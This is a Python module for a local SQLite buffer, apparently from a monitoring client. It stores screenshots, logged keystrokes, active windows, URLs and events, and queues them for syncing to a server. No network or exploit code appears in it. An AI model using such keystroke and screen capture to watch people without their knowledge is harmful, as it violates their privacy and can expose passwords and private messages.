import os
import sqlite3
import uuid
import threading

try:
    from client.config import DATA_DIR
except ImportError:
    from config import DATA_DIR

DB_PATH = os.path.join(DATA_DIR, "buffer.db")
IMAGES_DIR = os.path.join(DATA_DIR, "images")

_CREATE_TABLES = """
CREATE TABLE IF NOT EXISTS buffered_screenshots (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    captured_at TEXT NOT NULL,
    monitor_index INTEGER NOT NULL,
    image_filename TEXT NOT NULL,
    trigger TEXT DEFAULT '',
    active_process TEXT DEFAULT '',
    active_url TEXT DEFAULT '',
    window_title TEXT DEFAULT '',
    synced INTEGER DEFAULT 0
);

CREATE TABLE IF NOT EXISTS buffered_keystrokes (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    key_data TEXT NOT NULL,
    active_process TEXT DEFAULT '',
    active_window TEXT DEFAULT '',
    synced INTEGER DEFAULT 0
);

CREATE TABLE IF NOT EXISTS buffered_activities (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    process_name TEXT DEFAULT '',
    window_title TEXT DEFAULT '',
    url TEXT DEFAULT '',
    started_at TEXT NOT NULL,
    ended_at TEXT DEFAULT '',
    synced INTEGER DEFAULT 0
);

CREATE TABLE IF NOT EXISTS buffered_events (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    event_type TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    details TEXT DEFAULT '',
    synced INTEGER DEFAULT 0
);
"""


class LocalBuffer:
    def __init__(self):
        os.makedirs(DATA_DIR, exist_ok=True)
        os.makedirs(IMAGES_DIR, exist_ok=True)
        self._lock = threading.Lock()
        self._init_db()

    def _init_db(self):
        with self._connect() as conn:
            conn.executescript(_CREATE_TABLES)

    def _connect(self) -> sqlite3.Connection:
        conn = sqlite3.connect(DB_PATH, timeout=10)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL")
        return conn

    def save_screenshot(self, metadata: dict, image_bytes: bytes):
        filename = metadata.get("image_filename", f"{uuid.uuid4().hex}.jpg")
        filepath = os.path.join(IMAGES_DIR, filename)
        with open(filepath, "wb") as f:
            f.write(image_bytes)

        with self._lock, self._connect() as conn:
            conn.execute(
                """INSERT INTO buffered_screenshots
                   (id, user_id, captured_at, monitor_index, image_filename,
                    trigger, active_process, active_url, window_title)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (
                    metadata.get("id", uuid.uuid4().hex),
                    metadata.get("user_id", ""),
                    metadata.get("captured_at", ""),
                    metadata.get("monitor_index", 1),
                    filename,
                    metadata.get("trigger", ""),
                    metadata.get("active_process", ""),
                    metadata.get("active_url", ""),
                    metadata.get("window_title", ""),
                ),
            )

    def save_keystrokes(self, entries: list[dict]):
        if not entries:
            return
        with self._lock, self._connect() as conn:
            conn.executemany(
                """INSERT INTO buffered_keystrokes
                   (id, user_id, timestamp, key_data, active_process, active_window)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                [
                    (
                        e.get("id", uuid.uuid4().hex),
                        e.get("user_id", ""),
                        e.get("timestamp", ""),
                        e.get("key_data", ""),
                        e.get("active_process", ""),
                        e.get("active_window", ""),
                    )
                    for e in entries
                ],
            )

    def save_activity(self, entry: dict):
        with self._lock, self._connect() as conn:
            conn.execute(
                """INSERT INTO buffered_activities
                   (id, user_id, process_name, window_title, url, started_at, ended_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (
                    entry.get("id", uuid.uuid4().hex),
                    entry.get("user_id", ""),
                    entry.get("process_name", ""),
                    entry.get("window_title", ""),
                    entry.get("url", ""),
                    entry.get("started_at", ""),
                    entry.get("ended_at", ""),
                ),
            )

    def save_event(self, entry: dict):
        with self._lock, self._connect() as conn:
            conn.execute(
                """INSERT INTO buffered_events
                   (id, user_id, event_type, timestamp, details)
                   VALUES (?, ?, ?, ?, ?)""",
                (
                    entry.get("id", uuid.uuid4().hex),
                    entry.get("user_id", ""),
                    entry.get("event_type", ""),
                    entry.get("timestamp", ""),
                    entry.get("details", ""),
                ),
            )

    def get_unsynced_screenshots(self, limit: int = 10) -> list[tuple[dict, str]]:
        with self._lock, self._connect() as conn:
            rows = conn.execute(
                """SELECT * FROM buffered_screenshots
                   WHERE synced = 0 ORDER BY captured_at ASC LIMIT ?""",
                (limit,),
            ).fetchall()
        results = []
        for row in rows:
            meta = dict(row)
            img_path = os.path.join(IMAGES_DIR, meta["image_filename"])
            results.append((meta, img_path))
        return results

    def get_unsynced_keystrokes(self, limit: int = 50) -> list[dict]:
        with self._lock, self._connect() as conn:
            rows = conn.execute(
                """SELECT * FROM buffered_keystrokes
                   WHERE synced = 0 ORDER BY timestamp ASC LIMIT ?""",
                (limit,),
            ).fetchall()
        return [dict(r) for r in rows]

    def get_unsynced_activities(self, limit: int = 50) -> list[dict]:
        with self._lock, self._connect() as conn:
            rows = conn.execute(
                """SELECT * FROM buffered_activities
                   WHERE synced = 0 ORDER BY started_at ASC LIMIT ?""",
                (limit,),
            ).fetchall()
        return [dict(r) for r in rows]

    def get_unsynced_events(self, limit: int = 50) -> list[dict]:
        with self._lock, self._connect() as conn:
            rows = conn.execute(
                """SELECT * FROM buffered_events
                   WHERE synced = 0 ORDER BY timestamp ASC LIMIT ?""",
                (limit,),
            ).fetchall()
        return [dict(r) for r in rows]

    def mark_synced(self, table: str, ids: list[str]):
        allowed = {
            "buffered_screenshots",
            "buffered_keystrokes",
            "buffered_activities",
            "buffered_events",
        }
        if table not in allowed:
            return
        if not ids:
            return
        placeholders = ",".join("?" for _ in ids)
        with self._lock, self._connect() as conn:
            conn.execute(
                f"UPDATE {table} SET synced = 1 WHERE id IN ({placeholders})", ids
            )

    def delete_synced(self):
        with self._lock, self._connect() as conn:
            rows = conn.execute(
                "SELECT image_filename FROM buffered_screenshots WHERE synced = 1"
            ).fetchall()
            for row in rows:
                path = os.path.join(IMAGES_DIR, row["image_filename"])
                try:
                    if os.path.exists(path):
                        os.remove(path)
                except OSError:
                    pass

            conn.execute("DELETE FROM buffered_screenshots WHERE synced = 1")
            conn.execute("DELETE FROM buffered_keystrokes WHERE synced = 1")
            conn.execute("DELETE FROM buffered_activities WHERE synced = 1")
            conn.execute("DELETE FROM buffered_events WHERE synced = 1")

    def get_unsynced_count(self) -> dict:
        with self._lock, self._connect() as conn:
            counts = {}
            for table in (
                "buffered_screenshots",
                "buffered_keystrokes",
                "buffered_activities",
                "buffered_events",
            ):
                row = conn.execute(
                    f"SELECT COUNT(*) as cnt FROM {table} WHERE synced = 0"
                ).fetchone()
                counts[table] = row["cnt"] if row else 0
        return counts
